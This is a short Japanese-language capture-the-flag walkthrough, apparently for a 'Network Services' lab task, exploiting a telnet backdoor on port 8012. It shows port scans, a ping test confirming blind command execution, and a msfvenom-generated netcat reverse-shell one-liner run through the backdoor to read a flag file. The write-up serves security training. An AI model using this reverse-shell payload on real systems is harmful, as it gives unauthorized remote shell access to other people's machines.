# Networkservices

## Task7

### 前提

kali: 192.168.128.175
ターゲット: 10.48.151.66

### ターゲット端末の解放ポートの列挙

```
$ rustscan -a 10.48.151.66 --ulimit 5000

PORT     STATE SERVICE REASON
8012/tcp open  unknown syn-ack ttl 62


$ nmap -p8012 -sV 10.48.151.66

# 詳細が表示されて、何かコマンドの説明やバナーなどが表示されていることがわかる。
```

### telnetでつないでみる

.HELP等のコマンドが打てることが確認できるが、.RUN lsとかやっても無反応。

```
$ telnet 10.48.151.66 8012

Trying 10.48.151.66...
Connected to 10.48.151.66.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands

.HELP
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit
```

### コマンドが本当に実行されているのか確認をしてみる

kaliで、tcpdump

```
$ tcpdump -i tun0
```

ターゲットで、kaliい向けてping

```
.RUN ping -c 3192.168.128.175
```


kaliのtcpdumpの表示

```
09:16:31.336204 IP 10.48.151.66 > 192.168.128.175: ICMP echo request, id 2, seq 1, length 64
09:16:31.336261 IP 192.168.128.175 > 10.48.151.66: ICMP echo reply, id 2, seq 1, length 64
09:16:32.338174 IP 10.48.151.66 > 192.168.128.175: ICMP echo request, id 2, seq 2, length 64
09:16:32.338203 IP 192.168.128.175 > 10.48.151.66: ICMP echo reply, id 2, seq 2, length 64
09:16:33.339949 IP 10.48.151.66 > 192.168.128.175: ICMP echo request, id 2, seq 3, length 64
09:16:33.340026 IP 192.168.128.175 > 10.48.151.66: ICMP echo reply, id 2, seq 3, length 64
```

telnet内のプロンプトには実行結果が表示されないが、コマンドは実行されているよう。


### コマンドが実行できるならリバースシェルを試してみる


ローカルでペイロード作成

```
$ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.128.175 lport=4444 R

Payload size: 97 bytes
mkfifo /tmp/mybce; nc 192.168.128.175 4444 0</tmp/mybce | /bin/sh >/tmp/mybce 2>&1; rm /tmp/mybce

```

ローカルポートで待ち受け

```
$ nc -lvnp 4444
```

telnet内でペイロードを実行

```
.RUN mkfifo /tmp/mybce; nc 192.168.128.175 4444 0</tmp/mybce | /bin/sh >/tmp/mybce 2>&1; rm /tmp/mybce
```

ncでリバースシェルがキャッチ

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.128.175] from (UNKNOWN) [10.48.151.66] 55308


ls
flag.txt
snap


cat flag.txt
```
